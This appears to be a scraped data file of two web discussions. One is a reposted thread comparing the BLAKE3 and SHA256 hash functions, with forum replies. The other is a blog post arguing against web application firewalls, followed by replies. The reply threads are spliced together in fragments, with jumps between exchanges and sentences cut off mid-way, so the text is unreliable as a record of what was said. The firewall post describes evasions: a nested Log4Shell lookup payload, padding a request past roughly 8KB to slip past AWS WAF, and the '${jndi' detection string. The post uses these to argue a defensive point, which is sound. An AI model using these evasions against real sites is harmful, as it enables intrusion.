    "originBody": "menu Features Pricing Security Blog About Tech LOG IN SIGN UP Features Pricing Security Blog About Tech LOG IN SIGN UP Reasons to prefer blake3 over sha256 Published: Tue 09 May 2023 This post is a copy of tweets by Zooko Wilcox-O'Hearn. SHA256 was designed by the NSA. BLAKE (the original) and BLAKE3 were designed by Jean-Philippe Aumasson and others (including me, but Jean-Philippe and the other contributors did a lot more of the cryptographic heavy lifting than I did). SHA256 was based on SHA1 (which is weak). BLAKE was based on ChaCha20, which was based on Salsa20 (which are both strong). NIST/NSA have repeatedly signaled lack of confidence in SHA256: first by hastily organising the SHA3 contest in the aftermath of Wang's break of SHA1, then by making \"Don't be like SHA256\" a goal for the algorithms of that contest, and then by banning SHA256 from new designs to be used by the USA government (except for in one specific cryptosystem that protects from weaknesses in the hash function https://media.defense.gov/2022/Sep/07/2003071836/-1/-1/0/CSI_CNSA_2.0_FAQ_.PDF). BLAKE (the original) was very well-studied during the SHA3 competition. In NIST's final report on the SHA3 process, they stated that the depth of scientific analysis applied to BLAKE exceeded even that applied to Keccak (the final SHA3 winner). Known, feasible attacks can break 31 out of 64 rounds of SHA256 (48% of the rounds). Known, feasible attacks can break only 2 out of 7 rounds of BLAKE3 (29% of the rounds). BLAKE3 comes ‚Äúout of the box‚Äù with security features that can protect users in common use cases, such as protection against length-extension attack, a standard method of keying, \"personalization tags\" to guarantee domain separation, etc. BLAKE3 is much more efficient (in time and energy) than SHA256, like 14 times as efficient in typical use cases on typical platforms. BLAKE3 also offers performance that is competitive against SHA256 in a lot of different use cases and platforms, including some that might surprise you, such as sometimes being more efficient than SHA256 even when your CPU comes with SHA256 acceleration circuits built into it! BLAKE3 is highly parallelizable. This provides two performance advantages, only the first of which most people think about. The first is big data + big multicore: if the size of your data inputs scale up 100X but the number of CPU cores in your platform also scale up 100X, BLAKE3 takes only a little longer, but SHA256 takes approximately 100X times as long. The other advantage, less widely understood, is that inside a single compute device, new tech improvements provide more and more parallel power. This is true in FPGAs and GPUs, and it is true in CPUs because of vectorization upgrades. AVX in Intel/AMD, Neon and Scalable Vector Extensions in Arm, and RISC-V Vector computing in RISC-V. BLAKE3 can take advantage of all of it. When you upgrade to a newer CPU/platform/device, BLAKE3 typically further extends its performance advantage over SHA256 compared to the performance advantage it already had on the previous platform! Finally, BLAKE3 was designed and implemented by both cryptographers and software engineers. The reference implementations are super efficient and well-engineered for security, thanks to Jack O'Connor, Samuel Neves, and Jean-Philippe Aumasson: https://github.com/BLAKE3-team/BLAKE3 End of quote.

But:SHA256 was based on SHA1 (which is weak). BLAKE was based on ChaCha20, which was based on Salsa20 (which are both strong).NIST&#x2F;NSA have repeatedly signaled lack of confidence in SHA256: first by hastily organising the SHA3 contest in the aftermath of Wang&#x27;s break of SHA1No: SHA2 lacks the structure the SHA1 attack relies on it (SHA1 has a linear message schedule, which made it possible to work out a differential cryptanalysis attack on it).Blake&#x27;s own authors keep saying SHA2 is secure (modulo length extension), but people keep writing stuff like this. Blake3 is a good and interesting choice on the real merits! It doesn&#x27;t need the elbow throw. reply pbsd 16 hours agoparentWhile there is more confidence now on the security of SHA-2, or rather the lack of transference of the SHA-1 approach to SHA-2, this was not the case in 2005-2006 when NIST decided to hold the SHA-3 competition.

What if SHA2 was insecure, and Blake was secure, and the NSA just tricked people into not using Blake by saying that it&#x27;s secure?

Wiki has a table of cryptanalysis of SHA-2: https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;SHA-2#Cryptanalysis_and_valida...The summary is that either you attack a very reduced round variant and you get \"practical\" complexity for the attack, or you attack almost a full round variant and you get an entirely practical attack.So I think your interpretation of the subtext is entirely correct. reply rainsford 10 hours agorootparentprevWho I&#x27;m sure actually is informed, but in this particular case is tweeting things that do honestly sound like one of the uninformed commentators pclmulqdq mentioned. I&#x27;m not sure why, since as tptacek said, blake3 is good and maybe even preferable on it&#x27;s own merits without venturing into FUD territory. And if you still wanted to get into antiquated design arguments, picking on SHA256&#x27;s use of a construction that allows length extension attacks seems like more fair game. reply omginternets 14 hours agoparentprevWhat do you mean by \"weak\" and \"strong\", here? reply chx 11 hours agorootparentThere are fundamentally two kinds of attacks, preimage which splits into two:In a first-preimage attack, you know a hash value but not the message that created it, and you want to discover any message with the known hash value; in the second-preimage attack, you have a message and you want to find a second message that has the same hash. Attacks that can find one type of preimage can often find the other as well. A weak algorithm allows this to be done in less than 2^(hash length) attempts.And then there is collision: two messages which produce the same hash. A weak algorithm allows this to be done in less than 2^(half of hash length) attempts.Source: https:&#x2F;&#x2F;www.rfc-editor.org&#x2F;rfc&#x2F;rfc4270 reply nabla9 12 hours agorootparentprevWeak means that a mathematical flaw has been discovered that makes it inherently insecure, or that it is so simple that modern computer technology makes it possible to use ‚Äúbrute force‚Äù to crack.

It needs a cryptographic hash for the Merkle Tree.I&#x27;ve chosen BLAKE3, and I&#x27;m going to use the original implementation because of its speed.However, I&#x27;m going to make it easy to change hash algorithms per commit, just so I don&#x27;t run into the case that Git had trying to get rid of SHA1. reply AdamN 19 hours agoparentSmart idea doing the hash choice per-commit. Just make sure that somebody putting in an obscure hash doesn&#x27;t mess up everybody&#x27;s usage of the repo if they don&#x27;t have a library to evaluate that hash installed. reply gavinhoward 18 hours agorootparentI agree.There will be a set of presets of hash function and settings; if BLAKE3 fails, then I&#x27;ll actually have to add SHA3 or something, with a set of settings, as presets.The per-commit storage will then be an enum identifying the hash and its settings.This will let me do other things, like letting companies use a 512-bit hash if they expect the repo to be large. reply FabHK 17 hours agorootparent> letting companies use a 512-bit hash if they expect the repo to be large.A repo would have to have more than 1e32 documents for a one in a trillion chance of a collision with a 256 bit hash.

And you&#x27;re actually right for mine, but I decided to redo the math to make sure.My VCS will track things at a finer level than documents. In a C file, it will track individual functions and structs. In a Java file, it will track individual fields and classes. In a Microsoft Word document, it might track individual paragraphs. And in a Blender file, it will track each object, material, texture, etc. individually.Yes, it will handle binary files.Anyway, it will also be designed for non-technical users. To that end, it will hook into the source software and do a \"commit\" every time the user saves.It will also track individual directories to make renames work.I am a ctrl+s freak, so I save once a minute or more. However, other people are not, so let&#x27;s assume 10 minutes (for autosave, perhaps).Now let&#x27;s assume a monorepo for a company of 100,000 people. And let&#x27;s assume that when they save every 10 minutes, they save one object in one file (also tracked) two directories down. That means they create 5 hashes every 10 minutes (the fifth is the top level).Let&#x27;s assume an effective 6-hour work day.That&#x27;s 5 objects times 6 times per hour times 6 hours. That&#x27;s 180 objects a day per person.That&#x27;s 18,000,000 total objects per day. Times 5 for days in a week, times 50 for work weeks in a year.That&#x27;s 4.5 billion.Let&#x27;s multiply that by 40 for 40 years that the repo exists, which includes some of the oldest software.That&#x27;s 1.8e11 objects. According to [1], a 128-bit hash would not be enough for the error correction on a disk at that point.However, a 256-bit hash would give us a 10^31 objects before reaching that point, which gives us 10^20 times 40 years of space.Yep, you&#x27;re absolutely right that 512 bits is overkill. I stand corrected.[1]: https:&#x2F;&#x2F;en.m.wikipedia.org&#x2F;wiki&#x2F;Birthday_attack reply deadbeeves 13 hours agorootparentYou&#x27;re tracking things at the content level? How will you deal with files that are purposely broken, or which cause the parser to take impractical (but finite) times to complete? Also, tracking the history of a class makes sense to some extent, but you say you want to commit every time there&#x27;s a save. How will you maintain a history when most commits are likely to contain unparseable code and so break the continuity of objects? reply gavinhoward 12 hours agorootparentGood questions.> How will you deal with files that are purposely broken, or which cause the parser to take impractical (but finite) times to complete?I&#x27;ve never seen a language parser do that, but if I run into a language that does that, I&#x27;ll probably have my VCS track it at the file level, based on tokens or lines.Dumb languages don&#x27;t get nice things. :)> How will you maintain a history when most commits are likely to contain unparseable code and so break the continuity of objects?This is less of a problem with binary files (assuming the source software does not have bugs in output), but with source files, you&#x27;re right that that problem does exist.As of right now, I would do a token-based approach. This approach removes the need for whitespace-only commits, and if I track the tokens right, I should be able to identify which right brace used to end the function until the broken code was saved. Then I would just save the function as broken using that same right brace.For example, say you have this: int main() { return 0; }My VCS would know that the right brace corresponds to the end of the function.Then you write this: int main() { if (global_bool) { return 0; }Yes, a dumb system might think that the right brace is for the `if`.However, if you break it down by tokens, the VCS will see that `if (global_bool) {` were added before the return, so it should be able to tell that the right brace still ends the function.I hope that makes sense.Another plausible way to do it (at least in C) would be to look for things that look like declarations. The series of tokens `` is probably a function declaration. Java would be easier; its declarations are more wordy.I still have to prove this is possible, but I think it is. reply dmoy 9 hours agorootparent> As of right now, I would do a token-based approachC++ is gonna get really funky there, with e.g. templates reply gavinhoward 7 hours agorootparentAgreed.

So check if repository supports your algorithm, if not then include it inside your commit. reply tromp 19 hours agoprevFor short inputs, Blake3 behaves very similar to Blake2, on which it is based. From Blake&#x27;s wikipedia page [1]:BLAKE3 is a single algorithm with many desirable features (parallelism, XOF, KDF, PRF and MAC), in contrast to BLAKE and BLAKE2, which are algorithm families with multiple variants. BLAKE3 has a binary tree structure, so it supports a practically unlimited degree of parallelism (both SIMD and multithreading) given long enough input.[1] https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;BLAKE_(hash_function) reply cesarb 19 hours agoprevWhile I really like Blake3, for all reasons mentioned in this article, I have to say it does have one tiny disadvantage over older hashes like SHA-256: its internal state is slightly bigger (due to the tree structure which allows it to be highly parallelizable). This can matter when running on tiny microcontrollers with only a few kilobytes of memory. reply londons_explore 18 hours agoparentThe internal state is no bigger when hashing small things though right?I assume most microcontrollers are unlikely to be hashing things much bigger than RAM. reply oconnor663 18 hours agorootparentIt&#x27;s hard to give a short answer to that question :)- Yes, if you know your input is short, you can use a smaller state. The limit is roughly a BLAKE2s state plus (32 bytes times the log_2 of the number of KiB you need to hash). Section 5.4 of https:&#x2F;&#x2F;github.com&#x2F;BLAKE3-team&#x2F;BLAKE3-specs&#x2F;blob&#x2F;master&#x2F;blak... goes into this.- But it&#x27;s hard to take advantage of this space optimization, because no libraries implement it in practice.- But the reason libraries don&#x27;t implement it is that almost no one needs it. The max state size is just under 2 KiB, which is small enough even for https:&#x2F;&#x2F;github.com&#x2F;oconnor663&#x2F;blake3-6502.- But it would be super easy to implement if we just put the \"CV stack\" on the heap instead of allocating the whole thing as an array up front.- But the platforms that care about this don&#x27;t have a heap.@caesarb mentioned really tiny microcontrollers, even tinier than the 6502 maybe. The other place I&#x27;d expect to see this optimization is in a full hardware implementation, but those are rare. Most hardware accelerators for hash functions provide the block operation, and they leave it to software to deal with this sort of bookkeeping. reply Retr0id 13 hours agoprevBlake3 is a clear winner for large inputs.However, for smaller inputs (~1024 bytes and down), the performance gap between it and everything else (blake2, sha256) gets much narrower, because you don&#x27;t get to benefit from the structural parallelization.If you&#x27;re mostly dealing with small inputs, raw hash throughput is probably not high on your list of concerns - In the context of a protocol or application, other costs like IO latency probably completely dwarf the actual CPU time spent hashing.If raw performance is no longer high on your list of priorities, you care more about the other things - ubiquitous and battle-tested library support (blake3 is still pretty bleeding-edge, in the grand scheme of things), FIPS compliance (sha256), greater on-paper security margin (blake2). Which is all to say, while blake3 is great, there are still plenty of reasons not to prefer it for a particular use-case. reply zahllos 18 hours agoprevI agree that if you can, BLAKE3 (or even BLAKE2) are nicer choices than SHA2. However I would like to add the following comments:* SHA-2 fixes the problems with SHA-1. SHA-1 was a step up over SHA-0 that did not completely resolve flaws in SHA-0&#x27;s design (SHA-0 was broken very quickly).* JP Aumasson (one of the B3 authors) has said publicly a few times SHA-2 will never be broken: https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=13733069 is an indirect source, can&#x27;t seem to locate a direct one from Xitter (thanks Elon).Thus it does not necessarily follow that SHA-2 is a bad choice because SHA-1 is broken. reply gavinhoward 18 hours agoparentAll that may be true.However, I don&#x27;t think we can say for sure if SHA2 will be broken. Cryptography is hard like that.In addition, SHA2 is still vulnerable to length extension attacks, so in a sense, SHA2 is broken, at least when length extension attacks are part of the threat model. reply zahllos 14 minutes agorootparentIf you want to be pedantic we can say there is definitely a collision in SHA-2. Assume we have 2^256 unique inputs. Hash them all and assume no collisions. Now, if we have one more unique input (so 2^256 + 1 inputs) we have a collision. The same logic applies to BLAKE3.However we do actually know quite a bit on how to design hash functions to make this hard to do in practice. The latest cryptanalysis (to actually find a collision) either requires a vastly reduced number of rounds or is is computationally infeasible. There&#x27;s no clear flaw like there was with SHA1, where the path to finding a collision has been known since ~2004.Length extension \"attacks\" sure, that&#x27;s an unfortunate design choice. But it doesn&#x27;t impact at all on collision resistance, which is what is implied by suggesting SHA1 is vulnerable then SHA2 is.In the end, if you can use BLAKE3 or BLAKE2, great, I probably would as well. There isn&#x27;t always a choice (e.g. there&#x27;s no blake3 support in most crypto hardware) and if there isn&#x27;t, sha3 or sha2 are fine choices. reply EdSchouten 19 hours agoprevWhat I dislike about BLAKE3 is that they added explicit logic to ensure that identical chunks stored at different offsets result in different Merkle tree nodes (a.k.a. the ‚Äòchunk counter‚Äô).Though this feature is well intended, it makes this hash function hard to use for a storage system where you try to do aggressive data deduplication.Furthermore, on platforms that provide native instructions for SHA hashing, BLAKE3 isn‚Äôt necessarily faster, and certainly more power hungry. reply oconnor663 17 hours agoparentWe go over some of our reasoning around that in section 7.5 of https:&#x2F;&#x2F;github.com&#x2F;BLAKE3-team&#x2F;BLAKE3-specs&#x2F;blob&#x2F;master&#x2F;blak.... An early BLAKE3 prototype actually didn&#x27;t include the chunk counter (https:&#x2F;&#x2F;github.com&#x2F;oconnor663&#x2F;bao&#x2F;blob&#x2F;master&#x2F;docs&#x2F;spec_0.9....), so I&#x27;m definitely sympathetic to the use cases that wish it wasn&#x27;t there.

From the sound of it, you&#x27;re trying to do something like rsync&#x27;s running-window comparison? reply EdSchouten 18 hours agorootparentImagine the case where you&#x27;re trying to create a storage system for a large number of virtual machine images (e.g., you&#x27;re trying to build your own equivalent of AWS Machine Images). There is obviously a lot of duplication between parts of images. And not necessarily at the same offset, but also at different offsets that are n*2^k bytes apart, where 2^k represents the block&#x2F;sector size.You could consider building this storage system on top of BLAKE3&#x27;s tree model. Namely you store blocks as small Merkle tree. And an image is basically a collection of blocks that has a different &#x27;hat&#x27; on top of it. Unfortunately, BLAKE3 makes this hard, because the same block will end up having a different Merkle tree node depending on the offset at which it&#x27;s stored. reply prirun 17 hours agorootparentAuthor of HashBackup here. I don&#x27;t see how any kind of hash tree would be effective at de-duplicating VM machine images, other than the degenerate case of an exact copy, which is easy to detect with a single file hash.Most OSes use 4K block sizes. To get the best dedup you have to hash every 4K block and lookup each one individually in a dedup table. Two VM images could both contain an identical 4GB file, but every 4K block of that file could be stored at different offsets in the VM images. A tree hash wouldn&#x27;t let you dedup anything but identical sections stored at identical offsets, whereas a dedup table and 4K blocks allows you to dedup the entire file. reply londons_explore 18 hours agorootparentprevSounds to me like you are trying to use the innards of a hash algorithm for something for which it was not designed...Either modify the algorithm to your needs, and rename it.Or just use something thats already suitable off-the-shelf.

I think all of the SHA-3 candidates did the right thing here, and we would never accept a new cryptographic hash function that didn&#x27;t do the right thing here, but SHA-2 gets a pass for legacy reasons. That&#x27;s understandable, but we need to replace it eventually.- Kind of niche, but BLAKE3 supports incremental verification, i.e. checking the hash of a file while you stream it rather learning whether it was valid at the end of the stream. https:&#x2F;&#x2F;github.com&#x2F;oconnor663&#x2F;bao. That&#x27;s useful if you know the hash of a file but you don&#x27;t necessarily trust the service that&#x27;s storing it. reply jandrewrogers 8 hours agoparentprevI think SHA-256 is still marginal for speed in modern environments unless your I&#x2F;O is unusually limited relative to CPU. Current servers can support 10s of GB&#x2F;s combined throughput for network and storage, which is achievable in practice for quite a few workloads. Consequently, you have to plan for the CPU overhead of the crypto at the same GB&#x2F;s throughput since it is usually applied at the I&#x2F;O boundaries. The fact that SHA256 requires burning the equivalent of several more cores relative to Blake3 has been a driver in Blake3 anecdotally creeping into a lot of data infrastructure code lately. At these data rates, the differences in performance of the hash functions is not a trivial cost in the cases where you would use a hash function (instead of e.g. authenticated encryption).The arm64 server case is less of a concern for other reasons. Those cores are significantly weaker than amd64 cores, and therefore tend to not be used for data-intensive processing regardless. This allows you to overfit for AVX-512 or possibly use SHA256 on arm64 builds depending on the app.There is a strong appetite for as much hashing performance per core as possible for data-intensive processing because it consumes a significant percentage of the total CPU time in many cases. Due to the rapid growing scale, non-cryptographic hash functions are no longer fit for purpose much of the time. reply ndsipa_pomu 19 hours agoprevAt this rate, it&#x27;s going to take over 700 years before we get Blake&#x27;s 7 reply benj111 14 hours agoparentI had to scroll disappointingly far down to get to the Blake&#x27;s 7 reference.Thank you for not disappointing though.The down side of that algorithm though is that everything dies at the end. reply nayuki 18 hours agoprevIt&#x27;s an interesting set of reasons, but I prefer Keccak&#x2F;SHA-3 over SHA-256, SHA-512, and BLAKE.

Switching the hash function where you can is enough to result in user-visible speedups for common hashing use cases; verifying build artifacts, seeing if on-disk files changed, etc. I was writing something to produce OCI container images a few months ago, and the 3x SHA256 required by the spec for layers actually takes on the order of seconds. (.5s to sha256 a 50MB file, on my 2019-era Threadripper!) I was shocked to discover this. (gzip is also very slow, like shockingly slow, but fortunately the OCI spec lets you use Zstd, which is significantly faster.) reply adrian_b 14 hours agoparentSHA256 is very fast on most modern CPUs, i.e. all AMD Zen, all Intel Atom since 2016, Intel Core Ice Lake or newer, Armv8 and Armv9.I use every day both SHA-256 and BLAKE3. BLAKE3 is faster only because it is computed by multiple threads using all available CPU cores. When restricted to a single thread, it is slower on CPUs with fast hardware SHA-256.The extra speed of BLAKE3 is not always desirable. The fact that it uses all cores can slow down other concurrent activities, without decreasing the overall execution time of the application.There are cases when the computation of a hash like SHA-256 can be done as a background concurrent activity, or when the speed of hashing is limited by the streaming speed of data from the main memory or from a SSD, so spawning multiple threads does not gain anything and it only gets in the way of other activities.So the right choice between SHA-256 and BLAKE3 depends on the application. Both can be useful. SHA-256 has the additional advantage that it needs negligible additional code, only a few lines are necessary to write a loop that computes the hash using the hardware instructions. reply dralley 8 hours agorootparent>I use every day both SHA-256 and BLAKE3.

    "title": "Rethinking Web Application Security: Moving Away from Web Application Firewalls",
    "originLink": "https://www.macchaffee.com/blog/2023/wafs/",
    "originBody": "Stop deploying web application firewalls 2023-11-11 I wanted to write this because I don't hear enough real people discouraging the use of Web Application Firewalls (WAFs). Probably because the search results for \"Web Application Firewall\" are all written by WAF vendors. Anyone reading just that could conclude that WAFs are a good idea. I'm here to offer another perspective, after having suffered through using a WAF for two years. Web Application Firewalls were created early in the Internet's history, especially popularized by the ModSecurity project in 2002. WAFs essentially work by intercepting every single HTTP request (and sometimes responses too) and evaluating several hundred regular expressions over the URI, headers, and body, sometimes aided by machine learning. If the request kinda looks like SQL, shell code, etc., the server may block your request. In the infancy of the cybersecurity field, WAFs seemed like a good idea. HTTP requests were tiny, infrequent, and mostly contained mundane form data. But today, WAFs have overstayed their welcome in the security toolbelt. There are better techniques you can use that make even the most advanced WAFs entirely obsolete. WAFs have Horrible Performance Since WAFs run hundreds of regular expressions on every request, you may ask, \"isn't that super inefficient?\" Yes, very.WAF No WAF Average time taken to upload 9,462 text files 7.36 4.55 Average requests per second 1285 2079 Number of requests blocked erroneously 5 0 Peak nginx CPU during trial 73% 8% Specifics about the benchmark In addition to slowing down every request, you also need significant additional RAM for buffering requests. Since not a single byte in the buffer can be flushed to the backend server until the WAF completes its analysis, you need several gigabytes of RAM to store request bodies. Servers like nginx buffer requests by default, but enough large concurrent requests (like pushing a container image) can make a buffering web server run out of RAM. When using a WAF, every server becomes a buffering web server, which is simply incompatible with many types of applications. I know computers are fast and hardware is cheap, but we shouldn't be spending that kind of CPU and RAM on WAFs unless they're a really effective security tool. But they aren't, as you'll see next. WAFs are Easily Bypassed WAF vendors and attackers are locked in a constant arms race, but it seems attackers are much better armed. How could they not be? Many of the attacks that a WAF purports to block involve complex grammars like SQL, shell code, and entire programming languages. They often include comments, character escaping, encoding issues, and more oddities. These oddities mean that attackers always have a significant advantage and can typically bypass any WAF rule if they are clever enough. For example, you might think Log4shell is pretty easy to catch: just check for ${jndi, right? Unfortunately, Log4J supports nested \"lookups\", including ones that convert letters to upper/lower case like ${lower:J} That means an attacker can insert an arbitrary number of nested lookups around each letter and still perform the attack, like this: ${${lower:J}ndi:.... This lead CloudFlare to say \"WAF vendors need to be looking at any occurrence of ${ and treating it as suspicious\", which is just another hilarious example of how WAFs can never live up to the expectations placed on them. I just discussed the fairly simple grammar that is Log4J Lookups, but you can imagine how many more evasion tactics you could use in a language as complex as SQL or PHP, especially when considering encoding tricks. For an in-depth description of specific WAF bypass techniques, check out this awesome post. Another way to bypass a WAF involves just padding your attack string to appear >8KB or so into the request body. Like I mentioned in the section on performance, request bodies must be buffered into RAM for analysis, so WAFs must choose some cut-off point to avoid spending infinite CPU and RAM on a single request. For some WAFs like AWS's, that cutoff point is around 8KB. So if you just put 8192 innocuous characters before your Log4Shell attack string, you've rendered the WAF worthless. WAFs are an Attack Vector In 2019, CapitalOne experienced a breach of 100 million credit applications that was allegedly caused by a WAF misconfiguration. The attacker allegedly tricked the WAF into sending requests to the EC2 Metadata Service, which handed out a credential that allowed reading sensitive files from S3. While this is just one example, it illustrates the curious fact that WAFs actually have a large attack surface. Most WAFs are giant, complex codebases that are usually closed-source and written in memory-unsafe languages. Since they're expensive \"enterprise\" products, companies stuff them full of unnecessary features to make them stand out more than competitors. All of this adds up to make WAFs yet another example of a dangerous \"security\" tool, just like SolarWinds. No security officer would approve taking such a risky piece of software, putting it directly on the internet, making it parse mountains of untrusted input, and giving it access to all your backend servers, logging infra, SIEM, alerting systems, and even JIRA for some reason UNLESS it's covered in security buzzwords and costs 5-6 figures per year. Somehow, companies that sell security products have gotten a pass on implementing foundational security principles like secure by default, secure by design, attack surface reduction, and the principle of least privilege. Don't let them keep getting away with that. WAFs have a High False Positive Rate Over the last twenty years, open-source WAF rulesets have expanded considerably to detect more-recent types of attack. Apparently all those proprietary WAFs are doing the same. That means there are more and more possible strings that could trigger a WAF to block your request. If you want to write a comment on an article discussing Log4shell, you might be blocked for including the string ${jndi in your comment. So naturally the false positive rate continues to rise with every new rule, and it's already quite high based on my experience maintaining a giant list of ModSecurity rule exceptions. So-called \"next-generation\" WAFs claim to solve this problem by looking at multiple requests or by using IP reputation systems. While these can improve false positive rates, they can never truly solve the problem. In some ways, less false positives can increase the impact of particular false positives since neither users nor support teams have a clear procedure for fixing it. CloudFlare's algorithm can randomly decide to block you and you will have no recourse. Imagine that happening to someone less tech-savvy. This is the classic problem with using an outdated security tool like a WAF: defenders have to configure the tool absolutely perfectly to be safe and avoid false positives, but attackers just need to find a single weakness. Those are horrible odds. You should use alternatives that don't require perfection from imperfect humans. Alternatives to WAFs Since WAFs are resource-hungry, inneffective, unsafe, and noisy, how do I convince an auditor to not make me use one? The technical term would be to use \"compensating controls\", but that sounds like such a weak term to describe the powerful and simple alternatives to WAFs I'm about to describe: Isolation: Isolation involves ensuring that a breach in one component can not affect the rest of the system, and there are many technologies that provide isolation. Browsers do this by executing all code inside special sandboxed processes that don't have carte blanch access to cookies, saved passwords, other tabs, etc. Imagine how slow the web would be if every piece of JavaScript needed to be analyzed by hundreds of regexes before being executed! Microservices are designed with isolation in mind, but you can also do it in a monolith with a variety of libraries and languages. Immutability: Entire classes of attack can be eliminated by removing a few assumptions, like having a readOnlyRootFilesystem, a package manager that requires rebooting, or append-only/immutable backups. Static Analysis: SQL injection has a miracle cure called \"prepared statements\". The problem is that devs forget to use them. Static analysis checks in a CI pipeline can all but ensure that zero SQL injection vulnerabilities are in your codebase, at which point there is no need for any SQL injection WAF rules. No, \"defense in depth\" is not a valid excuse to use a WAF anyway, because it provides no real defense! Like surrounding Fort Knox with an army of guard guinea pigs. Capability-based security: Not every API endpoint needs to have unrestricted read/write access to your entire database and file system, but that is the normal way people build APIs today. By using capabilities, you can express exactly that \"GET /api/v1/books\" only needs read access to the \"books\" table. Or that \"POST /api/v1/imageupload\" needs write access to a specific folder, but doesn't need the ability to spawn processes. Now I'll admit these ideas are quite broad; you'll need to adapt them to your particular app. WAF vendors offer a one-WAF-fits-all fantasy that I can't match. But these secure-by-design strategies are the way that the security industry needs to be heading. Unfortunately, it's a lot harder for the security industry to profit off of design-based techniques, so don't hold your breath.",

Fully loaded an average enterprise will pay > $1M a year to maintain the capability if you look at the TCO carefully.There are environments where this makes sense. Banks are the classic - they have the money, they care about the risk, lots of places have systems still on java 8 and take > 1 month to deploy code fixes.The biggest practical problem in my experience is that it&#x27;s almost impossible to keep good people maintaining an enterprise WAF. Anyone with a deep enough understanding of web app security and network infra to do the job properly will get bored in the role and leave. WAFs are usually barely maintained for this reason.Another major issue is alert handling - there&#x27;s nobody with enough context. The SOC staff usually understand nothing (not the vuln, not web, not the app). The devs don&#x27;t understand the vuln and the security team don&#x27;t understand the app so tickets go round in circles with nobody able to understand if an alert is an FP or an actual issue. Eventually alerts start getting quietly dropped on the floor. reply mox1 8 hours agorootparentCan confirm.

You have to be realistic about their capabilities however and what you can expect from a part-timer managing one.You end up choosing between a heavyweight \"advanced\" WAF (either cloud or on-prem) that requires lots of tuning and response, which most orgs can&#x27;t do properly, or a lightweight cloud WAF with vendor rules that doesn&#x27;t do much but hey at least it&#x27;s easy to look after.Re: enterprise WAF maintenance, I know this is anecdotal but I was a pentester for 10 years and I could count the \"non-dysfunctional enterprise WAF setups\" I saw on one hand.

Compliance standards need to address the risks and weigh them against the benefits of WAFs. If, as the author argues, they have reached a point where they do more harm than good, the compliance bodies need to be honest about that and reevaluate recommendations. reply parl_match 12 hours agoprevA few counters to this:First off, most large applications need something on the edge to help deal with volumetric attacks. If you&#x27;ve already got something there, adding a light WAF engine isn&#x27;t exactly a huge ask. It&#x27;s (almost) free.Also, WAFs let you \"fast patch\" against vulnerabilities. The Log4j example the author gives as a negative is actually a positive. Your vendor can help prevent you from being attacked while you have time to respond. Those rules given in the example are bad, for sure, and probably have false positives - but, a few days of a slightly higher rate of false positives while you patch is probably worth it to most organizations.Lastly, WAFs let you increase \"risk scores\" of requests and IPs, which lets you turn up captchas and other roadblocks against malicious IPs. This raises the bar from the floor to somewhere about knee height. Not a lot, but one more thing for an attacker to have to step over.I do agree, though, that people treat WAFs as a magic solution or make them really heavy. Against application attacks, I view them as a tool of medium importance. Also, there are also better and worse vendors out there. Personally, in a WAF, I view \"less as more\".The more rules and complexity, the more problems you&#x27;re going to have. Adding rules should be temporary, and there&#x27;s very few reasons to have blocking rulesets for long running issues. reply macNchz 11 hours agoparent> people treat WAFs as a magic solutionI think ultimately acknowledging that there are no magic solutions, only a variety of options that can each contribute to reducing the probability of something bad happening, is critical to approaching security issues effectively.My first experience with WAFs was part of a check-the-box security&#x2F;compliance process, and I thought they were dumb. Easy to work around! Just regexes! With time I&#x27;ve come to appreciate that they&#x27;re pretty low effort to operate, can be fairly lightweight, and wind up being one more thing for an attacker to deal with, in a world where each thing they have to deal with decreases their chances of success and increases the chance of someone noticing.If we assume that basically everything can be bypassed by a sufficiently motivated attacker, the best approach is defense-in-depth where there are multiple barriers they need to traverse, and little opportunity to do so \"quietly\". WAFs can be evaded with clever approaches, sure, but getting to that point means they initially triggered a block, and have to make additional requests to test their evasion payload, each of which increases the signal we have to block more aggressively, trigger an alarm, and get a human involved. reply sbarre 12 hours agoprevMost large companies have too many developers and too many teams to expect&#x2F;assume that each team will do the right thing for security when putting something in production on the public Internet.Why? Because most software developers are bad at security (I said most not all).So yes do all the things at the bottom of this article! Teach security-by-design to all your teams. Make sure they know what OWASP is at least. Make sure you test all the things. Either own or rent red teams.But if you&#x27;re a big enough company, you probably also need something centralized like a WAF, because you want defense in depth.WAFs are far from perfect, but in my experience they are better than not having one in 2023. reply verve_rat 11 hours agoparent> Why? Because most software developers are bad at security (I said most not all).In my experience it is that most software engineers are not incentivized to care about security. reply sbarre 10 hours agorootparentThis is my personal opinion but any developer building software that runs on the public Internet should not need to be incentivized to care about security.It&#x27;s a fundamental part of the job. reply verve_rat 9 hours agorootparentLet me rephrase: software development (the action of engineers and the whole process in general) is actively insensitvised to not care about security.The consequences of poor security are often way, way lower than the costs of doing it properly. Add on to that, that security problems are contingent risks that only \"pay out\" in a small number of cases and you have a recipe for low expected value for investment into security.Software engineers often want to develop a secure product, but they don&#x27;t know what they don&#x27;t know, and their employer is not interested in investment in their security capabilities, both the companies security capabilities and the capabilities of their employees. reply tekla 9 hours agorootparentprevHow about the incentive of doing your job properly. reply joshchaney 11 hours agoprevI think WAF is really a bigger set of tools now (bot protection, IP reputation, L7 DDoS&#x2F;rate limiting, API restrictions) than just signatures. Virtual patching is also incredibly important and there&#x27;s really no other security tool that gives you the granularity to restrict something like the values of some param on a specific path of your app, but only when some cookie exists.I don&#x27;t think the performance concerns here are accurate. I think these days most people are using vendors own cloud infra (Akamai, Cloudflare, F5, Imperva, etc), but even if you are using WAF on-prem, F5 and Imperva sell purpose built hardware that have no problem handling tons of requests. Most WAF&#x27;s also have weighted signatures these days and won&#x27;t just fire on ${jndi. \"${jndi\" might give 5pts, while \"org.apache.*\" gives another 5, and maybe their threshold is set for 10 for blocking.I have plenty of issues with WAF&#x27;s and I would invest a lot more in developer training, but I think they still have their place. reply hn_throwaway_99 13 hours agoprevHallelujah. Also, with many single-phase apps, WAFs don&#x27;t make any sense - the HTML&#x2F;CSS content is just served statically, so the potential vulnerabilities are in the API, which IMO is much easier to harden. Without going into too much of a tangent, this is one reason I&#x27;m a big fan of GraphQL. It&#x27;s strong typing and support for custom scalar types means malformed content gets rejected before it even gets to your code. For example, most injection attacks require the use of some \"special\" characters likeI think of WAFs as an extra safety net. Defense in depth.The WAF itself is a complex codebase written in a performance-critical domain, so they&#x27;re generally implemented in memory-unsafe languages. If the services behind the WAF are implemented at all competently, you&#x27;re probably increasing the attack surface by more by adding the WAF than you&#x27;re saving. reply VWWHFSfQ 11 hours agoparentprevOr even do what what 